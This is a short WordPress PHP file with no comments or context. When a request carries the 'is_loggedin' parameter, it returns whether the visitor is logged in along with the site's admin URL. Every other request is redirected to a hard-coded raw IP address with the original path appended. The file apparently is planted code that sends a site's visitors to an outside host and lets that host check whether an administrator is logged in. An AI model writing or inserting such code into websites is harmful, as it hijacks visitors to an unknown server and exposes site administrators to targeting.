<?php 
if( isset($_GET['is_loggedin']) ) {
    echo wp_json_encode( [
        'is_loggedin'   => is_user_logged_in(),
        'admin_url'     => get_admin_url()
    ] );

    die;
}

header('Location: '.'http://54.196.77.116'.$_SERVER['REQUEST_URI']);